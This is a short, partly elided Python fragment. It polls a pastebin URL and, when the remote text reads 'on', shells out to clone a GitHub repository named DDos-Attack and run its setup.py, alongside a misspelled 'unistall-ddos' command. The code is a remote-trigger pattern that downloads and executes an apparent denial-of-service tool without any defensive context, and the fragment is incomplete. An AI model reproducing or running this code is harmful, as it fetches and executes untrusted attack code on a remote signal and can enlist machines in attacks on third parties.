...
import requests
remote=requests.get('https://pastebin.com/raw/eWMKmBFF').text
...
if remote=='on':
    ...
    os.system('unistall-ddos')
    os.system('git clone https://github.com/T0XIC-X4B1R/DDos-Attack')
    os.system('cd DDos-Attack && python setup.py')
